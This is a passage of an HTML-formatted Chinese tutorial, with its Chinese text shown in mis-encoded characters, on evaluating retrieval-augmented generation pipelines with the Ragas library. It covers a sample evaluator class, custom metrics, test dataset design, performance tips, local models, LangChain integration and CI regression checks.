        <span class="hljs-string">"""
        åˆå§‹åŒ–è¯„ä¼°å™¨

        Args:
            llm_model: RAG ç³»ç»Ÿä½¿ç”¨çš„ LLM
            evaluator_model: è¯„ä¼°å™¨ä½¿ç”¨çš„ LLM
        """</span>
        <span class="hljs-comment"># åˆå§‹åŒ– RAG ç³»ç»Ÿ LLM</span>
        self.rag_llm = ChatOpenAI(model=llm_model)

        <span class="hljs-comment"># åˆå§‹åŒ–è¯„ä¼°å™¨ LLM</span>
        self.evaluator_llm = ChatOpenAI(
            model=evaluator_model,
            temperature=<span class="hljs-number">0</span>
        )
        evaluator_wrapper = LangchainLLMWrapper(self.evaluator_llm)

        <span class="hljs-comment"># åˆå§‹åŒ– Embeddings</span>
        openai_client = openai.OpenAI()
        self.embeddings = OpenAIEmbeddings(client=openai_client)

        self.doc_embeddings = <span class="hljs-literal">None</span>
        self.docs = <span class="hljs-literal">None</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">load_knowledge_base</span>(<span class="hljs-params">self, documents: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">str</span>]</span>) -&gt; <span class="hljs-literal">None</span>:
        <span class="hljs-string">"""åŠ è½½çŸ¥è¯†åº“"""</span>
        self.docs = documents
        self.doc_embeddings = self.embeddings.embed_texts(documents)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_retrieve_docs</span>(<span class="hljs-params">self, query: <span class="hljs-built_in">str</span>, top_k: <span class="hljs-built_in">int</span> = <span class="hljs-number">3</span></span>) -&gt; <span class="hljs-built_in">list</span>[<span class="hljs-built_in">str</span>]:
        <span class="hljs-string">"""æ£€ç´¢ç›¸å…³æ–‡æ¡£"""</span>
        query_emb = self.embeddings.embed_text(query)
        similarities = [
            np.dot(query_emb, doc_emb) /
            (np.linalg.norm(query_emb) * np.linalg.norm(doc_emb))
            <span class="hljs-keyword">for</span> doc_emb <span class="hljs-keyword">in</span> self.doc_embeddings
        ]
        top_indices = np.argsort(similarities)[-top_k:][::-<span class="hljs-number">1</span>]
        <span class="hljs-keyword">return</span> [self.docs[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> top_indices]

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_generate_response</span>(<span class="hljs-params">self, query: <span class="hljs-built_in">str</span>, contexts: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">str</span>]</span>) -&gt; <span class="hljs-built_in">str</span>:
        <span class="hljs-string">"""ç”Ÿæˆå“åº”"""</span>
        context_text = <span class="hljs-string">"\n\n"</span>.join(contexts)
        prompt = <span class="hljs-string">f"åŸºäºä»¥ä¸‹æ–‡æ¡£å›ç­”é—®é¢˜ï¼š\n\n<span class="hljs-subst">{context_text}</span>\n\né—®é¢˜ï¼š<span class="hljs-subst">{query}</span>"</span>

        messages = [
            (<span class="hljs-string">"system"</span>, <span class="hljs-string">"ä½ æ˜¯ä¸€ä¸ªæœ‰å¸®åŠ©çš„åŠ©æ‰‹ã€‚ä»…åŸºäºæä¾›çš„æ–‡æ¡£å›ç­”é—®é¢˜ï¼Œä¸è¦ç¼–é€ ä¿¡æ¯ã€‚"</span>),
            (<span class="hljs-string">"human"</span>, prompt)
        ]

        response = self.rag_llm.invoke(messages)
        <span class="hljs-keyword">return</span> response.content

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">build_dataset</span>(<span class="hljs-params">self,
                     queries: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">str</span>],
                     references: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">list</span>[<span class="hljs-built_in">str</span>]] = <span class="hljs-literal">None</span></span>) -&gt; EvaluationDataset:
        <span class="hljs-string">"""æ„å»ºè¯„ä¼°æ•°æ®é›†"""</span>
        dataset = []

        <span class="hljs-keyword">for</span> i, query <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(queries):
            contexts = self._retrieve_docs(query)
            response = self._generate_response(query, contexts)

            sample = {
                <span class="hljs-string">"user_input"</span>: query,
                <span class="hljs-string">"retrieved_contexts"</span>: contexts,
                <span class="hljs-string">"response"</span>: response
            }

            <span class="hljs-keyword">if</span> references <span class="hljs-keyword">and</span> i &lt; <span class="hljs-built_in">len</span>(references):
                sample[<span class="hljs-string">"reference"</span>] = references[i]

            dataset.append(sample)

        <span class="hljs-keyword">return</span> EvaluationDataset.from_list(dataset)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">evaluate</span>(<span class="hljs-params">self,
                dataset: EvaluationDataset,
                metrics: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">list</span>] = <span class="hljs-literal">None</span></span>) -&gt; <span class="hljs-built_in">dict</span>:
        <span class="hljs-string">"""æ‰§è¡Œè¯„ä¼°"""</span>
        <span class="hljs-keyword">if</span> metrics <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            metrics = [
                ContextPrecision(),
                LLMContextRecall(),
                Faithfulness(),
                AnswerRelevancy()
            ]

        results = evaluate(
            dataset=dataset,
            metrics=metrics,
            llm=LangchainLLMWrapper(self.evaluator_llm)
        )

        <span class="hljs-keyword">return</span> results

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run_full_pipeline</span>(<span class="hljs-params">self,
                         documents: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">str</span>],
                         queries: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">str</span>],
                         references: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">list</span>[<span class="hljs-built_in">str</span>]] = <span class="hljs-literal">None</span>,
                         save_path: <span class="hljs-built_in">str</span> = <span class="hljs-string">"results.csv"</span></span>) -&gt; <span class="hljs-built_in">dict</span>:
        <span class="hljs-string">"""è¿è¡Œå®Œæ•´çš„è¯„ä¼°æµç¨‹"""</span>
        <span class="hljs-comment"># 1. åŠ è½½çŸ¥è¯†åº“</span>
        self.load_knowledge_base(documents)

        <span class="hljs-comment"># 2. æ„å»ºæ•°æ®é›†</span>
        dataset = self.build_dataset(queries, references)

        <span class="hljs-comment"># 3. æ‰§è¡Œè¯„ä¼°</span>
        results = self.evaluate(dataset)

        <span class="hljs-comment"># 4. ä¿å­˜ç»“æœ</span>
        results_df = results.to_pandas()
        results_df.to_csv(save_path, index=<span class="hljs-literal">False</span>)

        <span class="hljs-keyword">return</span> results


<span class="hljs-comment"># ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    <span class="hljs-string">"""ä¸»å‡½æ•°ç¤ºä¾‹"""</span>
    <span class="hljs-comment"># è®¾ç½® API Key</span>
    os.environ[<span class="hljs-string">"OPENAI_API_KEY"</span>] = <span class="hljs-string">"your-api-key"</span>

    <span class="hljs-comment"># ç¤ºä¾‹çŸ¥è¯†åº“</span>
    documents = [
        <span class="hljs-string">"Python æ˜¯ä¸€ç§é«˜çº§ç¼–ç¨‹è¯­è¨€ï¼Œç”± Guido van Rossum äº 1991 å¹´é¦–æ¬¡å‘å¸ƒã€‚"</span>,
        <span class="hljs-string">"JavaScript æ˜¯ä¸€ç§è„šæœ¬è¯­è¨€ï¼Œä¸»è¦ç”¨äº Web å¼€å‘ï¼Œç”± Brendan Eich åœ¨ 1995 å¹´åˆ›å»ºã€‚"</span>,
        <span class="hljs-string">"Rust æ˜¯ä¸€ç§ç³»ç»Ÿç¼–ç¨‹è¯­è¨€ï¼Œæ³¨é‡å®‰å…¨ã€å¹¶å‘å’Œæ€§èƒ½ï¼Œç”± Mozilla å¼€å‘ã€‚"</span>,
        <span class="hljs-string">"Go æ˜¯ç”± Google å¼€å‘çš„é™æ€ç±»å‹ç¼–ç¨‹è¯­è¨€ï¼Œä»¥å…¶ç®€æ´æ€§å’Œé«˜æ•ˆæ€§è‘—ç§°ã€‚"</span>,
        <span class="hljs-string">"TypeScript æ˜¯ JavaScript çš„è¶…é›†ï¼Œæ·»åŠ äº†é™æ€ç±»å‹ï¼Œç”± Microsoft å¼€å‘ã€‚"</span>
    ]

    <span class="hljs-comment"># æµ‹è¯•æŸ¥è¯¢</span>
    queries = [
        <span class="hljs-string">"è°åˆ›å»ºäº† Pythonï¼Ÿ"</span>,
        <span class="hljs-string">"JavaScript ä¸»è¦ç”¨äºä»€ä¹ˆï¼Ÿ"</span>,
        <span class="hljs-string">"Rust çš„ä¸»è¦ç‰¹ç‚¹æ˜¯ä»€ä¹ˆï¼Ÿ"</span>
    ]

    <span class="hljs-comment"># å‚è€ƒç­”æ¡ˆ</span>
    references = [
        <span class="hljs-string">"Guido van Rossum åœ¨ 1991 å¹´åˆ›å»ºäº† Python"</span>,
        <span class="hljs-string">"JavaScript ä¸»è¦ç”¨äº Web å¼€å‘"</span>,
        <span class="hljs-string">"Rust çš„ä¸»è¦ç‰¹ç‚¹æ˜¯å®‰å…¨ã€å¹¶å‘å’Œæ€§èƒ½"</span>
    ]

    <span class="hljs-comment"># åˆå§‹åŒ–è¯„ä¼°å™¨</span>
    evaluator = RAGEvaluator(
        llm_model=<span class="hljs-string">"gpt-4o"</span>,
        evaluator_model=<span class="hljs-string">"gpt-4o"</span>
    )

    <span class="hljs-comment"># è¿è¡Œå®Œæ•´è¯„ä¼°æµç¨‹</span>
    results = evaluator.run_full_pipeline(
        documents=documents,
        queries=queries,
        references=references,
        save_path=<span class="hljs-string">"evaluation_results.csv"</span>
    )

    <span class="hljs-comment"># æ‰“å°ç»“æœ</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n"</span> + <span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"Ragas è¯„ä¼°æŠ¥å‘Š"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
    <span class="hljs-keyword">for</span> metric_name, score <span class="hljs-keyword">in</span> results.items():
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{metric_name:30s}</span>: <span class="hljs-subst">{score:<span class="hljs-number">.4</span>f}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    main()
</code></pre>
<hr/>
<h3 data-id="heading-29">äº”ã€è‡ªå®šä¹‰è¯„ä¼°æŒ‡æ ‡</h3>
<h4 data-id="heading-30">5.1 ç¦»æ•£æŒ‡æ ‡ï¼ˆDiscreteMetricï¼‰</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> ragas.metrics <span class="hljs-keyword">import</span> DiscreteMetric

<span class="hljs-comment"># åˆ›å»ºè‡ªå®šä¹‰é€šè¿‡/å¤±è´¥æŒ‡æ ‡</span>
correctness_metric = DiscreteMetric(
    name=<span class="hljs-string">"correctness"</span>,
    prompt=<span class="hljs-string">"""æ£€æŸ¥å“åº”æ˜¯å¦åŒ…å«è¯„åˆ†æ ‡å‡†ä¸­æåˆ°çš„è¦ç‚¹ã€‚
åªè¿”å› 'pass' æˆ– 'fail'ã€‚

å“åº”: {response}
è¯„åˆ†æ ‡å‡†: {grading_notes}"""</span>,
    allowed_values=[<span class="hljs-string">"pass"</span>, <span class="hljs-string">"fail"</span>],
)

<span class="hljs-comment"># ä½¿ç”¨è‡ªå®šä¹‰æŒ‡æ ‡</span>
score = correctness_metric.score(
    llm=evaluator_llm,
    response=<span class="hljs-string">"Python æ˜¯ç”± Guido van Rossum åˆ›å»ºçš„"</span>,
    grading_notes=<span class="hljs-string">"- å¿…é¡»æåŠ Guido van Rossum\n- å¿…é¡»æåŠç¼–ç¨‹è¯­è¨€"</span>
)

<span class="hljs-built_in">print</span>(<span class="hljs-string">f"è¯„åˆ†ç»“æœ: <span class="hljs-subst">{score.value}</span>"</span>)  <span class="hljs-comment"># è¾“å‡º: pass æˆ– fail</span>
</code></pre>
<h4 data-id="heading-31">5.2 è¿ç»­æŒ‡æ ‡ï¼ˆContinuousMetricï¼‰</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> ragas.metrics <span class="hljs-keyword">import</span> ContinuousMetric

<span class="hljs-comment"># åˆ›å»ºè‡ªå®šä¹‰ 0-1 è¯„åˆ†æŒ‡æ ‡</span>
completeness_metric = ContinuousMetric(
    name=<span class="hljs-string">"completeness"</span>,
    prompt=<span class="hljs-string">"""è¯„ä¼°å“åº”çš„å®Œæ•´æ€§ï¼ˆ0-1 åˆ†ï¼‰ã€‚

é—®é¢˜: {question}
å“åº”: {response}
å‚è€ƒç­”æ¡ˆ: {reference}

è¯„åˆ†æ ‡å‡†:
- 1.0: å®Œå…¨è¦†ç›–æ‰€æœ‰è¦ç‚¹
- 0.5: è¦†ç›–éƒ¨åˆ†è¦ç‚¹
- 0.0: æœªè¦†ç›–ä»»ä½•è¦ç‚¹

åªè¿”å›æ•°å­—åˆ†æ•°ã€‚"""</span>,
)

<span class="hljs-comment"># ä½¿ç”¨è‡ªå®šä¹‰æŒ‡æ ‡</span>
score = completeness_metric.score(
    llm=evaluator_llm,
    question=<span class="hljs-string">"ä»€ä¹ˆæ˜¯ Pythonï¼Ÿ"</span>,
    response=<span class="hljs-string">"Python æ˜¯ä¸€ç§ç¼–ç¨‹è¯­è¨€"</span>,
    reference=<span class="hljs-string">"Python æ˜¯ä¸€ç§é«˜çº§ç¼–ç¨‹è¯­è¨€ï¼Œç”± Guido van Rossum åˆ›å»º"</span>
)

<span class="hljs-built_in">print</span>(<span class="hljs-string">f"å®Œæ•´æ€§å¾—åˆ†: <span class="hljs-subst">{score.value}</span>"</span>)
</code></pre>
<h4 data-id="heading-32">5.3 å¸¦æ¨ç†çš„æŒ‡æ ‡</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> ragas.metrics <span class="hljs-keyword">import</span> MetricWithLLM

<span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomMetric</span>(<span class="hljs-title class_ inherited__">MetricWithLLM</span>):
    <span class="hljs-string">"""è‡ªå®šä¹‰å¸¦æ¨ç†çš„è¯„ä¼°æŒ‡æ ‡"""</span>

    name = <span class="hljs-string">"custom_metric"</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_score</span>(<span class="hljs-params">self, row: <span class="hljs-built_in">dict</span>, llm</span>) -&gt; <span class="hljs-built_in">float</span>:
        <span class="hljs-string">"""è®¡ç®—åˆ†æ•°"""</span>
        prompt = <span class="hljs-string">f"""
        è¯„ä¼°ä»¥ä¸‹å“åº”çš„è´¨é‡ï¼š

        é—®é¢˜: <span class="hljs-subst">{row[<span class="hljs-string">'user_input'</span>]}</span>
        ä¸Šä¸‹æ–‡: <span class="hljs-subst">{row[<span class="hljs-string">'retrieved_contexts'</span>]}</span>
        å“åº”: <span class="hljs-subst">{row[<span class="hljs-string">'response'</span>]}</span>

        ç»™å‡º 0-1 çš„åˆ†æ•°ï¼Œå¹¶ç®€è¦è¯´æ˜ç†ç”±ã€‚
        """</span>

        response = llm.generate(prompt)
        <span class="hljs-comment"># è§£æå“åº”æå–åˆ†æ•°</span>
        score = self._extract_score(response)
        <span class="hljs-keyword">return</span> score

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_extract_score</span>(<span class="hljs-params">self, response: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">float</span>:
        <span class="hljs-string">"""ä» LLM å“åº”ä¸­æå–åˆ†æ•°"""</span>
        <span class="hljs-keyword">import</span> re
        <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r'(\d+\.?\d*)'</span>, response)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">float</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>))
        <span class="hljs-keyword">return</span> <span class="hljs-number">0.0</span>
</code></pre>
<hr/>
<h3 data-id="heading-33">å…­ã€æœ€ä½³å®è·µ</h3>
<h4 data-id="heading-34">6.1 è¯„ä¼°é©±åŠ¨å¼€å‘æµç¨‹</h4>
<pre><code class="hljs language-markdown" lang="markdown">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                  è¯„ä¼°é©±åŠ¨å¼€å‘ï¼ˆEDDï¼‰æµç¨‹                   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

<span class="hljs-bullet">    1.</span> å®šä¹‰è¯„ä¼°ç›®æ ‡
<span class="hljs-code">           â”‚
           â–¼
    2. å‡†å¤‡æµ‹è¯•æ•°æ®é›†
           â”‚
           â–¼
    3. å®ç°åŸºç¡€ RAG ç³»ç»Ÿ
           â”‚
           â–¼
    4. è¿è¡ŒåŸºå‡†è¯„ä¼°
           â”‚
           â–¼
    5. åˆ†æç“¶é¢ˆ
           â”‚
           â–¼
    6. ä¼˜åŒ–è¿­ä»£
           â”‚
           â–¼
    7. é‡æ–°è¯„ä¼° â†’ å¾ªç¯è‡³æ­¥éª¤ 5
</span></code></pre>
<h4 data-id="heading-35">6.2 æµ‹è¯•æ•°æ®é›†å‡†å¤‡</h4>
<h5 data-id="heading-36">æ•°æ®é›†è´¨é‡æ ‡å‡†</h5>

























<table><thead><tr><th>ç»´åº¦</th><th>æ ‡å‡†</th></tr></thead><tbody><tr><td><strong>è¦†ç›–åº¦</strong></td><td>è¦†ç›–ä¸åŒç±»å‹çš„é—®é¢˜ï¼ˆäº‹å®å‹ã€æ¨ç†å‹ã€å¼€æ”¾å‹ï¼‰</td></tr><tr><td><strong>éš¾åº¦æ¢¯åº¦</strong></td><td>åŒ…å«ç®€å•ã€ä¸­ç­‰ã€å›°éš¾æ ·æœ¬</td></tr><tr><td><strong>è¾¹ç•Œæƒ…å†µ</strong></td><td>åŒ…å«æ— ç­”æ¡ˆã€å¤šç­”æ¡ˆç­‰ç‰¹æ®Šæƒ…å†µ</td></tr><tr><td><strong>æ•°æ®é‡</strong></td><td>å»ºè®®è‡³å°‘ 50-100 ä¸ªæµ‹è¯•æ ·æœ¬</td></tr></tbody></table>
<h5 data-id="heading-37">æµ‹è¯•æ ·æœ¬åˆ†ç±»</h5>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># åˆ†ç±»ç¤ºä¾‹</span>
test_samples = {
    <span class="hljs-string">"factual"</span>: [  <span class="hljs-comment"># äº‹å®å‹é—®é¢˜</span>
        <span class="hljs-string">"Python çš„åˆ›å»ºè€…æ˜¯è°ï¼Ÿ"</span>,
        <span class="hljs-string">"JavaScript ä»€ä¹ˆæ—¶å€™å‘å¸ƒï¼Ÿ"</span>
    ],
    <span class="hljs-string">"reasoning"</span>: [  <span class="hljs-comment"># æ¨ç†å‹é—®é¢˜</span>
        <span class="hljs-string">"ä¸ºä»€ä¹ˆ Rust è¢«è®¤ä¸ºæ›´å®‰å…¨ï¼Ÿ"</span>,
        <span class="hljs-string">"æ¯”è¾ƒ Python å’Œ Go çš„é€‚ç”¨åœºæ™¯"</span>
    ],
    <span class="hljs-string">"open_ended"</span>: [  <span class="hljs-comment"># å¼€æ”¾å‹é—®é¢˜</span>
        <span class="hljs-string">"é€‰æ‹©åˆé€‚çš„ç¼–ç¨‹è¯­è¨€éœ€è¦è€ƒè™‘å“ªäº›å› ç´ ï¼Ÿ"</span>,
        <span class="hljs-string">"è§£é‡Šé™æ€ç±»å‹å’ŒåŠ¨æ€ç±»å‹çš„åŒºåˆ«"</span>
    ],
    <span class="hljs-string">"edge_cases"</span>: [  <span class="hljs-comment"># è¾¹ç•Œæƒ…å†µ</span>
        <span class="hljs-string">"å¦‚ä½•ç”¨ Brainfuck ç¼–å†™ Web åº”ç”¨ï¼Ÿ"</span>,  <span class="hljs-comment"># çŸ¥è¯†åº“ä¸­æ— ç­”æ¡ˆ</span>
        <span class="hljs-string">"ä»€ä¹ˆæ˜¯è¿™é—¨è¯­è¨€ï¼Ÿ"</span>,  <span class="hljs-comment"># æ¨¡ç³ŠæŒ‡ä»£</span>
    ]
}
</code></pre>
<h4 data-id="heading-38">6.3 æ€§èƒ½ä¼˜åŒ–å»ºè®®</h4>
<h5 data-id="heading-39">1. æ‰¹é‡è¯„ä¼°</h5>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ä½¿ç”¨æ‰¹é‡ API æé«˜è¯„ä¼°é€Ÿåº¦</span>
<span class="hljs-keyword">from</span> ragas <span class="hljs-keyword">import</span> RunConfig

results = evaluate(
    dataset=dataset,
    metrics=metrics,
    llm=evaluator_llm,
    run_config=RunConfig(
        batch_size=<span class="hljs-number">10</span>,  <span class="hljs-comment"># æ‰¹é‡å¤§å°</span>
        timeout=<span class="hljs-number">30</span>,     <span class="hljs-comment"># è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰</span>
    )
)
</code></pre>
<h5 data-id="heading-40">2. å¹¶è¡Œè¯„ä¼°</h5>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> asyncio
<span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor

<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">parallel_evaluation</span>(<span class="hljs-params">datasets, metrics</span>):
    <span class="hljs-string">"""å¹¶è¡Œè¯„ä¼°å¤šä¸ªæ•°æ®é›†"""</span>
    <span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=<span class="hljs-number">4</span>) <span class="hljs-keyword">as</span> executor:
        futures = [
            executor.submit(evaluate, ds, metrics, evaluator_llm)
            <span class="hljs-keyword">for</span> ds <span class="hljs-keyword">in</span> datasets
        ]
        results = [f.result() <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> futures]
    <span class="hljs-keyword">return</span> results
</code></pre>
<h5 data-id="heading-41">3. ç¼“å­˜æœºåˆ¶</h5>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> lru_cache

<span class="hljs-meta">@lru_cache(<span class="hljs-params">maxsize=<span class="hljs-number">1000</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">cached_evaluate</span>(<span class="hljs-params">query: <span class="hljs-built_in">str</span>, context: <span class="hljs-built_in">str</span>, response: <span class="hljs-built_in">str</span></span>):
    <span class="hljs-string">"""å¸¦ç¼“å­˜çš„è¯„ä¼°å‡½æ•°"""</span>
    <span class="hljs-comment"># è¯„ä¼°é€»è¾‘</span>
    <span class="hljs-keyword">pass</span>
</code></pre>
<h4 data-id="heading-42">6.4 æœ¬åœ°æ¨¡å‹ä½¿ç”¨</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-string">"""
ä½¿ç”¨æœ¬åœ°æ¨¡å‹é™ä½æˆæœ¬
é€‚ç”¨äºï¼šæ•æ„Ÿæ•°æ®ã€æˆæœ¬æ§åˆ¶ã€ä½å»¶è¿Ÿåœºæ™¯
"""</span>

<span class="hljs-comment"># ä½¿ç”¨ Ollama æœ¬åœ°æ¨¡å‹</span>
<span class="hljs-keyword">from</span> langchain_community.llms <span class="hljs-keyword">import</span> Ollama

<span class="hljs-comment"># é…ç½®æœ¬åœ°è¯„ä¼°å™¨</span>
local_evaluator = Ollama(
    model=<span class="hljs-string">"llama3.2:latest"</span>,
    temperature=<span class="hljs-number">0</span>,
    num_ctx=<span class="hljs-number">4096</span>
)

<span class="hljs-comment"># ä½¿ç”¨æœ¬åœ°æ¨¡å‹è¿›è¡Œè¯„ä¼°</span>
results = evaluate(
    dataset=dataset,
    metrics=[ContextPrecision(), Faithfulness()],
    llm=LangchainLLMWrapper(local_evaluator)
)
</code></pre>
<hr/>
<h3 data-id="heading-43">ä¸ƒã€è¿›é˜¶åŠŸèƒ½</h3>
<h4 data-id="heading-44">7.1 ä¸ LangChain é›†æˆ</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain_core.vectorstores <span class="hljs-keyword">import</span> VectorStore
<span class="hljs-keyword">from</span> langchain_core.retrievers <span class="hljs-keyword">import</span> BaseRetriever
<span class="hljs-keyword">from</span> ragas <span class="hljs-keyword">import</span> evaluate
<span class="hljs-keyword">from</span> ragas.integrations.langchain <span class="hljs-keyword">import</span> EvaluatorChain

<span class="hljs-comment"># åˆ›å»ºè¯„ä¼°é“¾</span>
evaluator_chain = EvaluatorChain(
    metrics=[ContextPrecision(), Faithfulness()],
    evaluator_llm=evaluator_llm
)

<span class="hljs-comment"># åœ¨ LangChain ç®¡é“ä¸­ä½¿ç”¨</span>
<span class="hljs-keyword">from</span> langchain_core.runnables <span class="hljs-keyword">import</span> RunnablePassthrough

rag_chain = (
    {
        <span class="hljs-string">"query"</span>: RunnablePassthrough(),
        <span class="hljs-string">"context"</span>: retriever | (<span class="hljs-keyword">lambda</span> docs: <span class="hljs-string">"\n"</span>.join([d.page_content <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> docs]))
    }
    | prompt
    | llm
    | evaluator_chain  <span class="hljs-comment"># æ·»åŠ è¯„ä¼°</span>
)
</code></pre>
<h4 data-id="heading-45">7.2 æŒç»­ç›‘æ§</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-string">"""
å°† Ragas é›†æˆåˆ° CI/CD æµç¨‹
"""</span>

<span class="hljs-keyword">import</span> json
<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime

<span class="hljs-keyword">class</span> <span class="hljs-title class_">CICDEvaluator</span>:
    <span class="hljs-string">"""CI/CD è¯„ä¼°å™¨"""</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, baseline_file: <span class="hljs-built_in">str</span> = <span class="hljs-string">"baseline.json"</span></span>):
        self.baseline_file = baseline_file
        self.baseline = self._load_baseline()

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_load_baseline</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">dict</span>:
        <span class="hljs-string">"""åŠ è½½åŸºå‡†åˆ†æ•°"""</span>
        <span class="hljs-keyword">try</span>:
            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(self.baseline_file) <span class="hljs-keyword">as</span> f:
                <span class="hljs-keyword">return</span> json.load(f)
        <span class="hljs-keyword">except</span> FileNotFoundError:
            <span class="hljs-keyword">return</span> {}

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">save_baseline</span>(<span class="hljs-params">self, scores: <span class="hljs-built_in">dict</span></span>) -&gt; <span class="hljs-literal">None</span>:
        <span class="hljs-string">"""ä¿å­˜åŸºå‡†åˆ†æ•°"""</span>
        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(self.baseline_file, <span class="hljs-string">'w'</span>) <span class="hljs-keyword">as</span> f:
            json.dump(scores, f, indent=<span class="hljs-number">2</span>)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">check_regression</span>(<span class="hljs-params">self, current_scores: <span class="hljs-built_in">dict</span>,
                        threshold: <span class="hljs-built_in">float</span> = <span class="hljs-number">0.05</span></span>) -&gt; <span class="hljs-built_in">dict</span>:
        <span class="hljs-string">"""æ£€æŸ¥æ€§èƒ½å›å½’"""</span>
        regressions = {}

        <span class="hljs-keyword">for</span> metric, current_score <span class="hljs-keyword">in</span> current_scores.items():
            <span class="hljs-keyword">if</span> metric <span class="hljs-keyword">in</span> self.baseline:
                baseline_score = self.baseline[metric]
                <span class="hljs-keyword">if</span> current_score &lt; baseline_score - threshold:
                    regressions[metric] = {
                        <span class="hljs-string">"baseline"</span>: baseline_score,
                        <span class="hljs-string">"current"</span>: current_score,
                        <span class="hljs-string">"diff"</span>: current_score - baseline_score
                    }

        <span class="hljs-keyword">return</span> regressions

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run_ci_check</span>(<span class="hljs-params">self, dataset: EvaluationDataset</span>) -&gt; <span class="hljs-built_in">bool</span>:
        <span class="hljs-string">"""è¿è¡Œ CI æ£€æŸ¥"""</span>
        <span class="hljs-comment"># æ‰§è¡Œè¯„ä¼°</span>
        results = evaluate(dataset=dataset, metrics=metrics)

        <span class="hljs-comment"># æ£€æŸ¥å›å½’</span>
        regressions = self.check_regression(results)

        <span class="hljs-keyword">if</span> regressions:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"âŒ å‘ç°æ€§èƒ½å›å½’:"</span>)
            <span class="hljs-keyword">for</span> metric, info <span class="hljs-keyword">in</span> regressions.items():
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  <span class="hljs-subst">{metric}</span>: <span class="hljs-subst">{info[<span class="hljs-string">'baseline'</span>]:<span class="hljs-number">.3</span>f}</span> â†’ <span class="hljs-subst">{info[<span class="hljs-string">'current'</span>]:<span class="hljs-number">.3</span>f}</span>"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"âœ… æ‰€æœ‰æŒ‡æ ‡æ­£å¸¸"</span>)
            self.save_baseline(results)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>


<span class="hljs-comment"># åœ¨ CI è„šæœ¬ä¸­ä½¿ç”¨</span>
